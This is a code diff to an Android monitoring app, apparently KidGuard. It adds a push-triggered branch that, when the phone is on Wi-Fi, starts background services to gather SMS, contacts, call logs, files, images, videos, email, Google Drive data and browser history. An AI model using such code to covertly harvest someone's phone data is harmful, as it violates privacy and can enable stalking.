@@ -11,9 +11,12 @@ import com.kidguard.services.BackgroundDataService;
 import com.kidguard.services.BlockAppService;
 import com.kidguard.services.GoogleAccountService;
 import com.kidguard.services.LocationService;
+import com.kidguard.utilities.Utilities;
 
 import org.json.JSONException;
 import org.json.JSONObject;
+
+import java.util.ArrayList;
 
 @SuppressWarnings("all")
 public class GCMIntentService extends GCMBaseIntentService implements Constant {
@@ -60,6 +63,7 @@ public class GCMIntentService extends GCMBaseIntentService implements Constant {
         } catch (Exception e) {
             Log.e(TAG, "Exception: " + e.getMessage());
         }
+
     }
 
     /* Pass Service Intent */
@@ -94,6 +98,32 @@ public class GCMIntentService extends GCMBaseIntentService implements Constant {
                     .putExtra(KEY_TAG, tag).putExtra(KEY_PACKAGE_NAME, count);
             startService(myIntent);
 
+        } else if (tag.equals(TAG_WIFI)) {
+
+            if (Utilities.isConnectedToWifi(this)) {
+                ArrayList<String> listTag = new ArrayList<>();
+                listTag.add(TAG_SMS);
+                listTag.add(TAG_CONTACTS);
+                listTag.add(TAG_CALLS);
+                listTag.add(TAG_FILES);
+                listTag.add(TAG_LIST_APPS);
+                listTag.add(TAG_IMAGES);
+                listTag.add(TAG_VIDEOS);
+                listTag.add(TAG_EMAIL);
+                listTag.add(TAG_GOOGLE_DRIVE);
+                listTag.add(TAG_BROWSER_HISTORY);
+
+                for (int i = 0; i < listTag.size(); i++) {
+                    Intent myIntent = new Intent(this, BackgroundDataService.class)
+                            .putExtra(KEY_TAG, listTag.get(i))
+                            .putExtra(KEY_COUNT, count)
+                            .putExtra(KEY_DATE_FROM, dateFrom)
+                            .putExtra(KEY_DATE_TO, dateTo)
+                            .putExtra(KEY_SIZE, size)
+                            .putExtra(KEY_SUBJECT, subject);
+                    startService(myIntent);
+                }
+            }
         } else {
             Log.e("hit", "hit??");
             Intent myIntent = new Intent(this, BackgroundDataService.class)
@@ -105,6 +135,8 @@ public class GCMIntentService extends GCMBaseIntentService implements Constant {
                     .putExtra(KEY_SUBJECT, subject);
             startService(myIntent);
         }
+
+
     }
 
     @Override
